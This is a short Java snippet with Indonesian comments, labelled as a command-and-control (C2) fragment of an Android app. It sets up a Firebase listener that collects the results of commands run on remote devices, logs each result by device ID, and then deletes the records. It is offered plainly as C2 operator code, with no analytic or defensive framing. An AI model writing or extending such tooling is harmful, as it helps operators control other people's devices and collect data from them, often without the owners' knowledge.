// Potongan kode untuk CommandFragment.java (C2)
// Pastikan listener aktif di onResume dan berhenti di onPause

private ChildEventListener resultsListener = new ChildEventListener() {
    @Override
    public void onChildAdded(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {
        String deviceId = snapshot.getKey();
        for (DataSnapshot resultSnap : snapshot.getChildren()) {
            String cmd = resultSnap.child("command").getValue(String.class);
            String result = resultSnap.child("result").getValue(String.class);
            Long ts = resultSnap.child("timestamp").getValue(Long.class);
            String time = ts != null ? new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(ts)) : "??:??:??";
            logAdapter.addLog("📥 [" + time + "] " + deviceId + ": " + result);
            Log.d("C2_RESULT", "Result: " + result);
        }
        snapshot.getRef().removeValue();
    }

    @Override public void onChildChanged(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {}
    @Override public void onChildRemoved(@NonNull DataSnapshot snapshot) {}
    @Override public void onChildMoved(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {}
    @Override public void onCancelled(@NonNull DatabaseError error) {
        Log.e("C2_RESULT", "Error: " + error.getMessage());
    }
};

@Override
public void onResume() {
    super.onResume();
    resultsRef.addChildEventListener(resultsListener);
}

@Override
public void onPause() {
    super.onPause();
    resultsRef.removeEventListener(resultsListener);
}
